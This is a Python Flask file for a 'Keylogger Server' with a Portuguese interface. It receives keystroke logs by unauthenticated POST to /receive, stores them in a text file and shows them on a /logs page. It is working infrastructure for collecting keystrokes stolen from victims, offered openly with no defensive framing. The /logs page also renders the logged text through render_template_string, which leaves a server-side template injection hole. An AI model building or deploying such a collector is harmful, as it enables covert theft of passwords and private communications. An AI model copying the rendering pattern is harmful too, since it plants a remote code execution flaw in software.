from flask import Flask, request, render_template_string
import os

class KeyloggerServer:
    def __init__(self, app, log_file="keylogs.txt"):
        self.app = app
        self.log_file = log_file
        self.setup_routes()

    def setup_routes(self):
        @self.app.route('/')
        def home():
            template = """
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
                <title>Keylogger Server</title>
            </head>
            <body class="bg-light">
                <div class="container mt-5">
                    <div class="text-center">
                        <img src="https://conteudo.imguol.com.br/c/noticias/bd/2019/07/17/navegacao-anonima-1563369219509_v2_1x1.jpg" alt="Keylogger" class="img-fluid mb-3" style="max-width:200px;">
                        <h1 class="mb-3">Keylogger Server</h1>
                        <p>Bem-vindo! Para visualizar os logs capturados, clique no botão abaixo.</p>
                        <a href="/logs" class="btn btn-primary">Ver Logs</a>
                    </div>
                </div>
            </body>
            </html>
            """
            return render_template_string(template)

        @self.app.route('/receive', methods=['POST'])
        def receive():
            keylogs = request.form.get('keylogs', '')
            with open(self.log_file, 'a') as f:
                f.write(keylogs + '\n')
            return "Recebido com sucesso"

        @self.app.route('/logs')
        def view_logs():
            if os.path.exists(self.log_file):
                with open(self.log_file, 'r') as f:
                    logs = f.read()
                template = f"""
                    <!DOCTYPE html>
                    <html lang="en">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
                        <title>Logs Capturados</title>
                    </head>
                    <body class="bg-light">
                        <div class="container mt-5">
                            <div class="text-center">
                                <h1 class="mb-4">Logs Capturados</h1>
                                <pre class="bg-dark text-light p-3 rounded">{logs}</pre>
                                <a href="/" class="btn btn-secondary mt-3">Voltar</a>
                            </div>
                        </div>
                    </body>
                    </html>
                """
                return render_template_string(template)
            else:
                template = """
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
                    <title>Sem Logs</title>
                </head>
                <body class="bg-light">
                    <div class="container mt-5 text-center">
                        <h1 class="text-danger">Sem logs disponíveis</h1>
                        <a href="/" class="btn btn-secondary mt-3">Voltar</a>
                    </div>
                </body>
                </html>
                """
                return render_template_string(template)


if __name__ == "__main__":
    app = Flask(__name__)
    server = KeyloggerServer(app)
    app.run(host="0.0.0.0", port=8000)